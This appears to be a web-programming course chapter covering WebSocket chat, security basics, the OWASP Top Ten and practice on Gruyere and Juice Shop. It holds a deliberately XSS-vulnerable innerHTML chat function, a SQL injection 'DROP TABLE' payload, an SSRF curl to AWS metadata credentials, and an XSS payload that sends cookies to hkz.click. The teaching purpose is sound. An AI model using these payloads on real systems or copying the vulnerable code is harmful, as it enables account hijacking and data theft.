+The great thing about test driven development (TDD) is that you can actually write your tests first and then write your code based upon the design represented by the tests. When your tests pass you know your code is complete. Additionally, when you make later modifications to your code you can simply run your tests again. If they pass then you can be confident that your code is still working without having to manually test everything yourself. With systems that have hundreds of endpoints and hundreds of thousands of lines of code, TDD becomes an indispensable part of the development process.
+
+## WebSocket
+
+webSocket
+
+HTTP is based on a client-server architecture. A client always initiates the request and the server responds. This is great if you are building a global document library connected by hyperlinks, but for many other use cases it just doesn't work. Applications for notifications, distributed task processing, peer-to-peer communication, or asynchronous events need communication that is initiated by two or more connected devices.
+
+For years, web developers created hacks to work around the limitation of the client/server model. This included solutions like having the client frequently pinging the server to see if the server had anything to say, or keeping client-initiated connections open for a very long time as the client waited for some event to happen on the server. Needless to say, none of these solutions were elegant or efficient.
+
+Finally, in 2011 the communication protocol WebSocket was created to solve this problem. The core feature of WebSocket is that it is fully duplexed. This means that after the initial connection is made from a client, using vanilla HTTP, and then upgraded by the server to a WebSocket connection, the relationship changes to a peer-to-peer connection where either party can efficiently send data at any time.
+
+WebSocket Upgrade
+
+WebSocket connections are still only between two parties. So if you want to facilitate a conversation between a group of users, the server must act as the intermediary. Each peer first connects to the server, and then the server forwards messages amongst the peers.
+
+WebSocket Peers
+
+Creating a WebSocket conversation
+JavaScript running on a browser can initiate a WebSocket connection with the browser's WebSocket API. First you create a WebSocket object by specifying the port you want to communicate on.
+
+You can then send messages with the send function, and register a callback using the onmessage function to receive messages.
+```js
+const socket = new WebSocket('ws://localhost:9900');
+
+socket.onmessage = (event) => {
+  console.log('received: ', event.data);
+};
+```
+socket.send('I am listening');
+The server uses the ws package to create a WebSocketServer that is listening on the same port the browser is using. By specifying a port when you create the WebSocketServer, you are telling the server to listen for HTTP connections on that port and to automatically upgrade them to a WebSocket connection if the request has a connection: Upgrade header.
+
+When a connection is detected it calls the server's on connection callback. The server can then send messages with the send function, and register a callback using the on message function to receive messages.
+```js
+const { WebSocketServer } = require('ws');
+
+const wss = new WebSocketServer({ port: 9900 });
+
+wss.on('connection', (ws) => {
+  ws.on('message', (data) => {
+    const msg = String.fromCharCode(...data);
+    console.log('received: %s', msg);
+
+    ws.send(`I heard you say "${msg}"`);
+  });
+
+  ws.send('Hello webSocket');
+});
+```
+In a later instruction we will show you how to run and debug this example.
+
+## Debugging WebSocket
+
+You can debug both sides of the WebSocket communication with VS Code to debug the server, and Chrome to debug the client. When you do this you will notice that Chrome's debugger has support specifically for working with WebSocket communication.
+
+WebSocket debugger
+
+Debugging the server
+Create a directory named testWebSocket and change to that directory.
+```js
+Run npm init -y.
+
+Run npm install ws.
+```
+Open VS Code and create a file named main.js. Paste the following code.
+```js
+const { WebSocketServer } = require('ws');
+
+const wss = new WebSocketServer({ port: 9900 });
+
+wss.on('connection', (ws) => {
+  ws.on('message', (data) => {
+    const msg = String.fromCharCode(...data);
+    console.log('received: %s', msg);
+
+    ws.send(`I heard you say "${msg}"`);
+  });
+
+  ws.send('Hello webSocket');
+});
+```
+Set breakpoints on the ws.send lines so you can inspect the code executing.
+
+Start debugging by pressing F5. The first time you may need to choose Node.js as the debugger.
+
+WebSocket server debugging
+
+Debugging the client
+Open the Chrome debugger by pressing F12.
+
+Paste this code into the debugger console window and press enter to execute it. Executing this code will immediately hit the server breakpoint. Take a look at what is going on and then remove the breakpoint from the server.
+```js
+const socket = new WebSocket('ws://localhost:9900');
+
+socket.onmessage = (event) => {
+  console.log('received: ', event.data);
+};
+```
+Select the Network tab and then select the HTTP message that was generated by the execution of the above client code.
+
+With the HTTP message selected, you then click the Messages tab to view the WebSocket messages
+
+Send a message to the server by executing the following in the debugger console window. This will cause the second server breakpoint to hit. Explore and then remove the breakpoint from the server.
+```js
+socket.send('I am listening');
+```
+You should see the messages in the Messages debugger window.
+
+Send some more messages and observe the communication back and forth without stopping on the breakpoints.
+
+
+## WebSocket chat
+
+With the understanding of what WebSockets are, the basics of using them from Node and the browser, and the ability to debug the communication, it is time to use WebSocket to build a simple chat application.
+
+WebSocket Peers
+
+In this example we will create an HTML page that uses WebSockets and displays the resulting chat. The server will forward the WebSocket communication from the different clients.
+
+Chat client
+The HTML for the client provides an input for the user's name, an input for creating messages, and an element to display the messages that are sent and received.
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WebSocket Chat</title>
+    <link rel="stylesheet" href="main.css" />
+  </head>
+  <body>
+    <div class="name">
+      <fieldset id="name-controls">
+        <legend>My Name</legend>
+        <input id="my-name" type="text" />
+      </fieldset>
+    </div>
+
+    <fieldset id="chat-controls" disabled>
+      <legend>Chat</legend>
+      <input id="new-msg" type="text" />
+      <button onclick="sendMessage()">Send</button>
+    </fieldset>
+    <div id="chat-text"></div>
+  </body>
+  <script src="chatClient.js"></script>
+</html>
+```
+The JavaScript for the application provides the interaction with the DOM for creating and displaying messages, and manages the WebSockets in order to connect, send, and receive messages.
+
+DOM interaction
+We do not want to be able to send messages if the user has not specified a name. So we add an event listener on the name input and disable the chat controls if the name ever is empty.
+```js
+const chatControls = document.querySelector('#chat-controls');
+const myName = document.querySelector('#my-name');
+myName.addEventListener('keyup', (e) => {
+  chatControls.disabled = myName.value === '';
+});
+```
+We then create a function that will update the displayed messages by selecting the element with the chat-text ID and appending the new message to its HTML. Security-minded developers will realize that manipulating the DOM in this way will allow any chat user to execute code in the context of the application. After you get everything working, if you are interested, see if you can exploit this weakness.
+```js
+function appendMsg(cls, from, msg) {
+  const chatText = document.querySelector('#chat-text');
+  chatText.innerHTML = `<div><span class="${cls}">${from}</span>: ${msg}</div>` + chatText.innerHTML;
+}
+```
+When a user presses the enter key in the message input we want to send the message over the socket. We do this by selecting the DOM element with the new-msg ID and adding a listener that watches for the Enter keystroke.
+```js
+const input = document.querySelector('#new-msg');
+input.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') {
+    sendMessage();
+  }
+});
+```
+When Enter is pressed the sendMessage function is called. This selects the text out of the new-msg element and the name out of the my-name element and sends that over the WebSocket. The value of the message element is then cleared so that it is ready for the next message.
+```js
+function sendMessage() {
+  const msgEl = document.querySelector('#new-msg');
+  const msg = msgEl.value;
+  if (!!msg) {
+    appendMsg('me', 'me', msg);
+    const name = document.querySelector('#my-name').value;
+    socket.send(`{"name":"${name}", "msg":"${msg}"}`);
+    msgEl.value = '';
+  }
+}
+```
+WebSocket connection
+Now we can set up our WebSocket. We want to be able to support both secure and non-secure WebSocket connections. To do this we look at the protocol that is currently being used as represented by the window.location.protocol variable. If it is non-secure HTTP then we set our WebSocket protocol to be non-secure WebSocket (ws). Otherwise we use secure WebSocket (wss). We use that to then connect the WebSocket to the same location that we loaded the HTML from by referencing the window.location.host variable.
+
+We can notify the user that chat is ready to go by listening to the onopen event and appending some text to the display using the appendMsg function we created earlier.
+```js
+// Adjust the webSocket protocol to what is being used for HTTP
+const protocol = window.location.protocol === 'http:' ? 'ws' : 'wss';
+const socket = new WebSocket(`${protocol}://${window.location.host}/ws`);
+
+// Display that we have opened the webSocket
+socket.onopen = (event) => {
+  appendMsg('system', 'websocket', 'connected');
+};
+When the WebSocket receives a message from a peer it displays it using the appendMsg function.
+
+socket.onmessage = async (event) => {
+  const text = await event.data.text();
+  const chat = JSON.parse(text);
+  appendMsg('friend', chat.name, chat.msg);
+};
+And if the WebSocket closes for any reason we also display that to the user and disable the controls.
+
+socket.onclose = (event) => {
+  appendMsg('system', 'websocket', 'disconnected');
+  document.querySelector('#name-controls').disabled = true;
+  document.querySelector('#chat-controls').disabled = true;
+};
+```
+Chat server
+The chat server runs the web service, serves up the client code, manages the WebSocket connections, and forwards messages from the peers.
+
+Web service
+The web service is established using a simple Express application. Note that we serve up our client HTML, CSS, and JavaScript files using the static middleware.
+```js
+const { WebSocketServer } = require('ws');
+const express = require('express');
+const app = express();
+
+// Serve up our webSocket client HTML
+app.use(express.static('./public'));
+
+const port = process.argv.length > 2 ? process.argv[2] : 3000;
+server = app.listen(port, () => {
+  console.log(`Listening on ${port}`);
+});
+```
+WebSocket server
+When we create our WebSocket we do things a little differently than we did with the simple connection example. Instead of letting the WebSocketServer control both the HTTP connection and the upgrading to WebSocket, we want to use the HTTP connection that Express is providing and handle the upgrade to WebSocket ourselves. This is done by specifying the noServer option when creating the WebSocketServer and then handling the upgrade notification that occurs when a client requests the upgrade of the protocol from HTTP to WebSocket.
+```js
+// Create a websocket object
+const wss = new WebSocketServer({ noServer: true });
+
+// Handle the protocol upgrade from HTTP to WebSocket
+server.on('upgrade', (request, socket, head) => {
+  wss.handleUpgrade(request, socket, head, function done(ws) {
+    wss.emit('connection', ws, request);
+  });
+});
+```
+Forwarding messages
+With the WebSocket server we can use the connection, message, and close events to forward messages between peers. On connection we insert an object representing the connection into a list of all connections from the chat peers. Then when a message is received we loop through the peer connections and forward it on to everyone except the peer who initiated the request. Finally we remove a connection from the peer connection list when it is closed.
+```js
+// Keep track of all the connections so we can forward messages
+let connections = [];
+
+wss.on('connection', (ws) => {
+  const connection = { id: connections.length + 1, alive: true, ws: ws };
+  connections.push(connection);
+
+  // Forward messages to everyone except the sender
+  ws.on('message', function message(data) {
+    connections.forEach((c) => {
+      if (c.id !== connection.id) {
+        c.ws.send(data);
+      }
+    });
+  });
+
+  // Remove the closed connection so we don't try to forward anymore
+  ws.on('close', () => {
+    connections.findIndex((o, i) => {
+      if (o.id === connection.id) {
+        connections.splice(i, 1);
+        return true;
+      }
+    });
+  });
+});
+```
+Keeping connections alive
+A WebSocket connection will eventually close automatically if no data is sent across it. In order to prevent that from happening the WebSocket protocol supports the ability to send a ping message to see if the peer is still there and receive pong responses to indicate the affirmative.
+
+It make this work we use setInterval to send out a ping every 10 seconds to each of our peer connections and clean up any connections that did not response to our previous ping.
+```js
+setInterval(() => {
+  connections.forEach((c) => {
+    // Kill any connection that didn't respond to the ping last time
+    if (!c.alive) {
+      c.ws.terminate();
+    } else {
+      c.alive = false;
+      c.ws.ping();
+    }
+  });
+}, 10000);
+In our connection handler we listen for the pong response and mark the connection as alive.
+
+// Respond to pong messages by marking the connection alive
+ws.on('pong', () => {
+  connection.alive = true;
+});
+```
+Any connection that did not respond will remain in the not alive state and get cleaned up on the next pass.
+
+Experiment
+You can find the complete example described above in this GitHub repository.
+
+Clone the repository.
+Run npm install from a console window in the example directory.
+Open up the code in VS Code and review what it is doing.
+Run and debug the example by pressing F5. You may need to select node.js as the debugger the first time you run.
+Open multiple browser windows and point them to http://localhost:3000 and start chatting.
+Use the browser's debugger to view the WebSocket communication.
+
+
+## Simon WebSocket
+🎥 Instruction video: Simon WebSocket
+
+Simon
+
+This deliverable demonstrates peer-to-peer communication using WebSocket. The functionality that Simon provides for peer communication is intentionally limited to display notifications between users. This was done so that the application would clearly demonstrate how WebSocket works rather than clutter the application with functionality that uses WebSockets.
+
+You can view this application running here: Example Simon WebSocket
+
+Handling WebSocket requests
+After installing the ws NPM package the next step is to attach a WebSocket listener to the HTTP server that was created in an earlier deliverable. This work is all done in the PeerProxy class implemented in the peerProxy.js file. The PeerProxy class contains the protocol upgrade from HTTP to WebSocket, tracks new WebSocket connections, passes (or proxies) requests between connections, and implements ping/pong to keep connections alive.
+
+Displaying and generating WebSocket messages
+The public/play.js file contains the functions for connecting, broadcasting, receiving, and displaying events using WebSocket.
+
+Simon WebSocket
+
+Leveraging the concepts demonstrated in this deliverable, you can implement additional functionality that uses peer-to-peer interactions. For example, you could make it so each connected peer has to complete one of the Simon patterns in turn.
+
+Study this code
+Get familiar with what this code teaches.
+
+Clone the repository to your development environment.
+
+git clone https://github.com/webprogramming260/simon-websocket.git
+Set up your Atlas credentials in a file named dbConfig.json that is in the same directory as database.js.
+
+Add dbConfig.json to your .gitignore file so that it doesn't put your credentials into GitHub accidentally.
+
+Review the code and get comfortable with everything it represents.
+
+Debug the code in your browser by hosting it from a VS Code debug session. This video on debugging a node.js based service will step you through the process.
+
+⚠ You will no longer use the live server extension to launch your frontend code in the browser since your frontend code will now be served up by the Node.js server you created in index.js. Set breakpoints in your backend code inside of Visual Studio.
+
+Use the browser's dev tools to set breakpoints in the code and step through it each line.
+
+Make modifications to the code as desired. Experiment and see what happens.
+
+
+## Security overview
+📖 Deeper dive reading:
+
+Database of publicized software vulnerabilities
+SQL Injection
+The internet allows us to socially connect, conduct financial transactions, and provide access to sensitive individual, corporate, and government data. It is also accessible from every corner of the planet. This positions the internet as a tool that can make the world a much better place, but it also makes a very attractive target for those who would seek to do harm. Preventing that potential for harm needs to be in the forefront of you mind whenever you create or use a web application.
+
+You can see bad actors at work on your very own server by using ssh to open a console to your server and reviewing the authorization log. The authorization log captures all of the attempts to create a session on your server.
+
+sudo less +G /var/log/auth.log
+The last entry in the log will be from your connection to the server.
+```js
+Feb 23 16:26:54 sshd[319071]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by (uid=0)
+Feb 23 16:26:54 systemd-logind[480]: New session 1350 of user ubuntu.
+Feb 23 16:26:54 systemd: pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by (uid=0)
+However, you will see lots of other attempts with specific user names associated with common exploits. These all should be failing to connect, but if your server is not configured properly then an unauthorized access is possible. The sample of attempts below show the IP addresses of the attacker, as well as the user name that they used. Using the whois utility we can see that these attacks are originating from servers at DLive.kr in Korea, and DigitalOcean.com in the USA.
+
+Feb 19 02:34:28 sshd[298185]: Invalid user developer from 27.1.253.142
+Feb 19 02:37:12 sshd[298193]: Invalid user minecraft1 from 27.1.253.142
+Feb 23 14:26:19 sshd[318868]: Invalid user siteadmin 174.138.72.191
+Feb 23 14:22:18 sshd[318845]: Invalid user tester 174.138.72.191
+```
+As an experiment, one of our TAs created a test server with a user named admin with password password. Within 15 minutes, an attacker had logged in, bypassed all the restrictions that were in place, and started using the server to attack other servers on the internet.
+
+Even if you don't think your application is valuable enough to require security, you need to consider that you might be creating a security problem for your users on other systems. For example, think about a simple game application where a user is required to provides a username and password in order to play the game. If the application's data is then compromised, then an attacker could use the password, used for the game application, to gain access to other websites where the user might have used the same password. For example, their social networking sites, work account, or financial institution.
+
+Security terminology
+Web application security, sometimes called AppSec, is a subset of cybersecurity that specifically focuses on preventing security vulnerabilities within end-user applications. Web application security involves securing the frontend code running on the user's device and also the backend code running on the web server.
+
+Here is a list of common phrases used by the security community that you should be familiar with.
+
+Hacking - The process of making a system do something it's not supposed to do.
+Exploit - Code or input that takes advantage of a programming or configuration flaw.
+Attack Vector - The method that a hacker employs to penetrate and exploit a system.
+Attack Surface - The exposed parts of a system that an attacker can access. For example, open ports (22, 443, 80), service endpoints, or user accounts.
+Attack Payload - The actual code, or data, that a hacker delivers to a system in order to exploit it.
+Input sanitization - "Cleaning" any input of potentially malicious data.
+Black box testing - Testing an application without knowledge of the internals of the application.
+White box testing - Testing an application by with knowledge of the source code and internal infrastructure.
+Penetration Testing - Attempting to gain access to, or exploit, a system in ways that are not anticipated by the developers.
+Mitigation - The action taken to remove, or reduce, a threat.
+Motivation for attackers
+The following lists some common motivations at drives a system attack.
+
+Disruption - By overloading a system, encrypting essential data, or deleting critical infrastructure, an attacker can destroy normal business operations. This may be an attempt at extortion, or simply be an attempt to punish a business that that attacker does not agree with.
+Data exfiltration - By privately extracting, or publicly exposing, a system's data, an attacker can embarrass the company, exploit insider information, sell the information to competitors, or leverage the information for additional attacks.
+Resource consumption - By taking control of a company's computing resources an attacker can use it for other purposes such as mining cryptocurrency, gathering customer information, or attacking other systems.
+Examples of security failures
+Security should always be a primary objective of any application. Building a web application that looks good and performs well, is a lot less important than building an application that is secure.
+
+Here are a few examples where companies failed to properly prevent attacks to their systems.
+
+$100 million dollars stolen through insider trading using SQL injection vulnerability
+Log4Shell remote code execution vulnerability, 93% of cloud vulnerable at time of discovery, dubbed "the most severe vulnerability ever"
+Russian hackers install backdoor on 18,000 government and Fortune 500 computers
+Hackers Hold Computers of 23 Texas Towns For Ransom
+Common hacking techniques
+There are a few common exploitation techniques that you should be aware of. These include the following.
+
+Injection: When an application interacts with a database on the backend, a programmer will often take user input and concatenate it directly into a search query. This allows a hacker can use a specially crafted query to make the database reveal hidden information or even delete the database.
+
+Cross-Site Scripting (XSS): A category of attacks where an attacker can make malicious code execute on a different user's browser. If successful, an attacker can turn a website that a user trusts, into one that can steal passwords and hijack a user's account.
+
+Denial of Service: This includes any attack where the main goal is to render any service inaccessible. This can be done by deleting a database using an SQL injection, by sending unexpected data to a service endpoint that causes the program to crash, or by simply making more requests than a server can handle.
+
+Credential Stuffing: People have a tendency to reuse passwords or variations of passwords on different websites. If a hacker has a user's credentials from a previous website attack, then there is a good chance that they can successfully use those credentials on a different website. A hacker can also try to brute force attack a system by trying every possible combination of password.
+
+Social engineering - Appealing to a human's desire to help, in order to gain unauthorized access or information.
+
+What can I do about it?
+Taking the time to learn the techniques a hacker uses to attack a system is the first step in preventing them from exploiting your systems. From there, develop a security mindset, where you always assume any attack surface will be used against you. Make security a consistent part of your application design and feature discussions. Here is a list of common security practices you should include in your applications.
+
+Sanitize input data - Always assume that any data you receive from outside your system will be used to exploit your system. Consider if the input data can be turned into an executable expression, or can overload computing, bandwidth, or storage resources.
+Logging - It is not possible to think of every way that your system can be exploited, but you can create an immutable log of requests that will expose when a system is being exploited. You can then trigger alerts, and periodically review the logs for unexpected activity.
+Traps - Create what appears to be valuable information and then trigger alarms when the data is accessed.
+Educate - Teach yourself, your users, and everyone you work with, to be security minded. Anyone who has access to your system should understand how to prevent physical, social, and software attacks.
+Reduce attack surfaces - Do not open access anymore than is necessary to properly provide your application. This includes what network ports are open, what account privileges are allowed, where you can access the system from, and what endpoints are available.
+Layered security - Do not assume that one safeguard is enough. Create multiple layers of security that each take different approaches. For example, secure your physical environment, secure your network, secure your server, secure your public network traffic, secure your private network traffic, encrypt your storage, separate your production systems from your development systems, put your payment information in a separate environment from your application environment. Do not allow data from one layer to move to other layers. For example, do not allow an employee to take data out of the production system.
+Least required access policy - Do not give any one user all the credentials necessary to control the entire system. Only give a user what access they need to do the work they are required to do.
+Safeguard credentials - Do not store credentials in accessible locations such as a public GitHub repository or a sticky note taped to a monitor. Automatically rotate credentials in order to limit the impact of an exposure. Only award credentials that are necessary to do a specific task.
+Public review - Do not rely on obscurity to keep your system safe. Assume instead that an attacker knows everything about your system and then make it difficult for anyone to exploit the system. If you can attack your system, then a hacker will be able to also. By soliciting public review and the work of external penetration testers, you will be able to discover and remove potential exploits.
+
+
+## OWASP
+owasp
+
+📖 Deeper dive reading: OWASP 2021
+
+The Open Web Application Security Project (OWASP) is a non-profit research entity that manages the Top Ten list of the most important web application security risks. Understanding, and periodically reviewing, this list will help to keep your web applications secure.
+
+The following is a discussion of each of the entries in the top ten list, along with examples, and suggested mitigations.
+
+A01 Broken Access Control
+📖 Deeper dive reading: snyk Learn broken access control
+
+Broken access control occurs when the application doesn't properly enforce permissions on users. This could mean that a non-admin user can do things that only an admin should be able to do, or admin accounts are improperly secured. While browser application code can restrict access by disabling UI for navigating to sensitive functionality, the ultimate responsibility for enforcing access control rests upon the application service.
+
+As an example of broken access control, consider an application where the UI only provides a navigation to the administrator application settings if the user is an administrator. However, the attacker can simply change the URL to point to the application settings URL and gain access. Additionally, unless the service endpoints reject requests to obtain, and update, the application settings, any restrictions that the UI provides are meaningless.
+
+Mitigations include:
+
+Strict access enforcement at the service level
+Clearly defined roles and elevation paths
+A02 Cryptographic Failures
+Cryptographic failures occur when sensitive data is accessible either without encryption, with weak encryption protocols, or when cryptographic protections are ignored.
+
+Sending any unencrypted data over a public network connection allows an attacker to capture the data. Even private, internal, network connections, or data that is store without encryption, is susceptibly to exploitation once an attacker gains access to the internal system.
+
+Examples of ineffective cryptographic methods include hashing algorithms like MD5 and SHA-1 that are trivial to crack with modern hardware and tools.
+
+Another cryptographic failure happens when applications do not validate the provided web certificate when establishing a network connection. This is a case of falsely assuming that if the protocol is secure then the entity represented by the protocol is acceptable.
+
+Mitigations include:
+
+Use strong encryption for all data. This includes external, internal, in transit, and at rest data.
+Updating encryption algorithms as older algorithms become compromised.
+Properly using cryptographic safeguards.
+A03 Injection
+📖 Deeper dive reading: Snyk Learn SQL injection
+
+Injection exploits occur when an attacker is allowed to supply data that is then injected into a context where it violates the expected use of the user input. For example, consider an input field that is only expected to contain a user's password. Instead the attacker supplies a SQL database command in the password input.
+
+Supplied password
+```js
+`p@ssword!'; DROP TABLE db; --`;
+```
+The application then uses a template SQL query to validate the user's password.
+
+Template query
+```js
+`SELECT user FROM db WHERE password='${password}' LIMIT 1`;
+```
+When the supplied input is injected into the template an unintended query results. Notice that this query will delete the entire database table.
+
+Resulting query
+
+SELECT user FROM db WHERE password='p@ssword!'; DROP TABLE db; -- ` LIMIT 1
+Mitigations include:
+
+Sanitizing input
+Use database prepared statements
+Restricting execution rights
+Limit output
+A04 Insecure Design
+📖 Deeper dive reading: Snyk Learn insecure design
+
+Insecure design broadly refers to architectural flaws that are unique for individual systems, rather than implementation errors. This happens when the application team doesn't focus on security when designing a system, or doesn't continuously reevaluate the application's security.
+
+Insecure design exploits are based upon unexpected uses of the business logic that controls the functionality of the application. For example, if the application allows for trial accounts to be easily created, then an attacker could create a denial of service attack by creating millions of accounts and utilizing the maximum allowable usage.
+
+Mitigations include:
+
+Integration testing
+Strict access control
+Security education
+Security design pattern usages
+Scenario reviews
+A05 Security Misconfiguration
+Security misconfiguration attacks exploit the configuration of an application. Some examples include using default passwords, not updating software, exposing configuration settings, or enabling unsecured remote configuration.
+
+For example, some third party utilities, such as a logging system, will expose a public administration interface that has a default user name and password. Unless that configuration is changed, an attacker will be able to access all of the critical logging information for your application.
+
+Mitigations include:
+
+Configuration reviews
+Setting defaults to disable all access
+Automated configuration audits
+Requiring multiple layers of access for remote configuration
+A06 Vulnerable and Outdated Components
+📖 Deeper dive reading: Snyk Learn vulnerable and outdate components
+
+The longer an application has been deployed, the more likely it is that the attack surface, and corresponding exploits, of the application will increase. This is primarily due to the cost of maintaining an application and keeping it up to date in order to mitigate newly discovered exploits.
+
+Outdated components often accumulate as third party packages are used by the application. Over time the packages are updated in order to address security concerns, or somethings the packages stop being supported. When this happens your application becomes vulnerable. Consider what happens when a request to install NPM packages displays the following warning:
+```js
+➜  npm install
+
+up to date, audited 1421 packages in 3s
+
+7 high severity vulnerabilities
+
+To address all issues (including breaking changes), run:
+  npm audit fix --force
+
+Run `npm audit` for details.
+```
+The application developer is warned that the components are vulnerable, but when faced choice of taking the time to update packages, and potentially break the application, or meeting deliverable deadlines, the developer is tempted to ignore the warning and continue without addressing the possible problem.
+
+Mitigations include:
+
+Keeping a manifest of your software stack including versions
+Reviewing security bulletins
+Regularly updating software
+Required components to be up to date
+Replacing unsupported software
+A07 Identification and Authentication Failures
+Identification and authentication failures include any situation where a user's identity can be impersonated or assumed by an attacker. For example, if an attacker can repeatedly attempt to guess a user's password, then eventually they will be successful. Additionally, if passwords are exposed outside of the application, or are stored inside the application, with weak cryptographic protection, then they are susceptible to attack.
+
+Another example of an identification failure would be a weak password recovery process that doesn't properly verify the user. Common practices such as asking for well known security questions (e.g. mother's maiden name) from a user fall into this category.
+
+Mitigations include:
+
+Rate limiting requests
+Properly managing credentials
+Multifactor authentication
+Authentication recovery
+A08 Software and Data Integrity Failure
+Software and data integrity failures represent attacks that allow external software, processes, or data to compromise your application. Modern web applications extensively use open source and commercially produced packages to provide key functionality. Using these packages without conducting a security audit, gives them an unknown amount of control over your application. Likewise, using a third party processing workflow, or blindly accessing external data, opens you up to attacks.
+
+Consider the use of a third party continuous delivery (CD) pipeline for deploying your application to a cloud provider. If the CD provider is penetrated by an attacker then they also gain access to your production cloud environment.
+
+Another example is the use of an NPM package that is controlled by an attacker. Once the package has gained general acceptance, the attacker can subtly change the package to capture and deliver sensitive information.
+
+Mitigations include:
+
+Only using trusted package repositories
+Using your own private vetted repository
+Audit all updates to third party packages and data sources
+A09 Security Logging and Monitoring Failures
+📖 Deeper dive reading: Snyk Learn logging vulnerabilities
+
+Proper system monitoring, logging, and alerting is critical to increasing security. One of the first things an attacker will do after penetrating your application is delete or alter any logs that might reveal the attacker's presence. A secure system will store logs that are accessible, immutable, and contain adequate information to detect an intrusion, and conduct post-mortem analysis.
+
+An attacker might also try to create a smoke screen in the monitoring system in order to hide a true attack. This might consist of a barrage of periodic ineffective attacks that hide the insertion of a slightly different effective one.
+
+Mitigations include:
+
+Real time log processing
+Automated alerts for metric threshold violations
+Periodic log reviews
+Visual dashboards for key indicators
+A10 Server Side Request Forgery (SSRF)
+📖 Deeper dive reading: Snyk Learn SSRF
+
+This category of attack causes the application service to make unintended internal requests, that utilized the service's elevated privileges, in order to expose internal data or services.
+
+For example, if your service exposed an endpoint that let a user retrieve an external profile image based upon a supplied URL, an attacker could change the URL to point to a location that is normally only available to the service internally.
+
+The following command would theoretically return the internal AWS service metadata that includes the administrative access token.
+
+curl https://yourdomain.click/user/image?imgUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/Admin-Role
+Mitigations include:
+
+Sanitizing returned data
+Not returning data
+Whitelisting accessible domains
+Rejecting HTTP redirects
+
+
+## Security practice
+
+You will not really internalize how security exploits work until you get some practice with them. One way to do this is to use a practice security web applications. There are lots of practice applications but we will discuss two of them, Gruyere and Juice Shop.
+
+Gruyere
+Gruyere provides tutorials and practice with things like Cross-site scripting (XSS), Denial of Service (DoS), SQL injection, and elevation of privilege attacks.
+
+Gruyere runs on Google AppEngine and so it is easy to start, play with, and reset when you want to start over.
+
+You can learn about how to use Gruyere by reading the set up page. Make sure you notice the Table of Contents located on the right side of the page in order to learn about the different attacks and how to exploit them.
+
+You start the practice environment by following this link. This will display a page that looks like the following.
+
+Gruyere
+
+For the purposes of this instruction we are only going to talk about Cross-Site Scripting (XSS) attacks. Feel free to explore everything provided by Gruyere as your time and interest allows.
+
+Cross-Site Scripting (XSS)
+Open the Gruyere Instruction on XSS. Take some time to read the description of XSS attacks and then open up the practice instance of Gruyere that you created above.
+
+Using what we have learned from the tasks, hints, and examples described in the Gruyere instruction, we will create our own XSS attack.
+
+Create an account in the Gruyere application using some bogus user name and password.
+
+Navigate back to the home page.
+
+Select the New Snippets option in order to create a snippet that will show on the home screen for all users of the application.
+
+The Gruyere developers assumed the snippet functionality would be used to share information about cheese, but you will use it to execute a XSS attack on anyone who views your snippet.
+
+Paste the following into the snippet input box and press submit.
+```html
+<img src="null" onerror="document.body.style.background='white'" />
+```
+XSS Snippet submission
+
+Now, whenever any user of Gruyere goes to their home page they will see your snippet, and it will execute the JavaScript XSS attack and turn their body background color white.
+
+XSS Snippet result
+
+If you logout of Gruyere and create a new user account, you will see that your attack works on all users.
+
+Changing the background color isn't very much of an attack, but it does visually demonstrate that you are have taken control of the application. You could just have easily grabbed the user's cookie and sent it to a service endpoint where you could start collecting information on Gruyere customers.
+```html
+<img src="null" onerror="fetch(`https://hkz.click/xss/${document.cookie}`)" />
+```
+If you create another snippet with the above example, open up the network tab in the browser's dev tools, and navigate to the Gruyere home page, you will see the browser attempting to send the user's cookie to hkz.click.
+
+XSS cookie grab
+
+Juice Shop
+Juice Shop
+
+OWASP provides a security training application called Juice Shop. Unlike Gruyere, You need to download the code for Juice Shop and run it from your own computer, but the advantage is that you have complete control over Juice Shop and it is a really good practice application.
+
+If you are at all interested in improving your security skills, you should take the time to install and explore Juice Shop. Otherwise what you have done with Gruyere should be enough to give you a feel for what security practice applications have to offer.
+
+Installing Juice Shop
+Clone the Juice Shop repository to your development environment and install the required NPM packages.
+```js
+git clone https://github.com/juice-shop/juice-shop.git --depth 1
+
+cd juice-shop
+
+npm install
+Run the application. This should start Juice Shop on port 3000.
+
+npm start
+You can now open your browser to localhost:3000. This will display the Juice Shop application.
+```
+JuiceShop Home
+
+Getting started
+The idea with Juice Shop is that you are suppose to learn by digging in and experimenting. For a person that is new to security hacking this can be a bit daunting, and so here is a hint to get you started.
+
+You can solve the first hacking challenge by discovering the hidden score board view that shows you all of the possible challenges to solve, and exposes the available tutorials. You can discover where the score board is by examining the contents of the main.js file in Dev Tools and seeing that it references a path named score-board. So if you change the url to be localhost:3000/#/score-board you will see the following view.
+
+JuiceShop Home
+
+You can then find a challenge that looks interesting and try to solve it. Challenges that have a tutorial icon will step you through the challenge and explain how it works. You can then use that knowledge to solve challenges that don't have a tutorial.
+
+To begin, it is suggested that you do the DOM XSS tutorial. This will show you how to do a XSS attack using the application search input.
+
+## Web frameworks
+
+📖 Deeper dive reading: MDN Introduction to client-side frameworks
+
+Web frameworks seek to make the job of writing web applications easier by providing tools for completing common application tasks. This includes things like modularizing code, creating single page applications, simplifying reactivity, and supporting diverse hardware devices.
+
+Some frameworks take things beyond the standard web technologies (HTML, CSS, JavaScript) and create new hybrid file formats that combine things like HTML and JavaScript into a single file. Examples of this include React JSX, Vue SFC, and Svelte files. Abstracting away the core web file formats puts the focus on functional components rather than files.
+
+There are lots of web frameworks to choose from and they evolve all the time. You can view the latest popularity poll at StateOfJS.
+
+web frameworks
+
+- Source: StateOfJS web framework poll
+
+Each framework has advantages and disadvantages. Some are very prescriptive (opinionated) about how to do things, some have major institutional backing, and others have a strong open source community. Other factors you want to consider include how easy it is to learn, how it impacts productivity, how performant it is, how long it takes to build, and how actively the framework is evolving.
+
+Hello world examples
+For our classwork we will use the web framework React. However, before we dig into React let's look at how the major frameworks would render a simple hello world application.
+
+Vue
+Vue combines HTML, CSS, and JavaScript into a single file. HTML is represented by a template element that can be aggregated into other templates.
+
+SFC
+```html
+<script>
+  export default {
+    data() {
+      return {
+        name: 'world',
+      };
+    },
+  };
+</script>
+
+<style>
+  p {
+    color: green;
+  }
+</style>
+
+<template>
+  <p>Hello {{ name }}!</p>
+</template>
+```
+Svelte
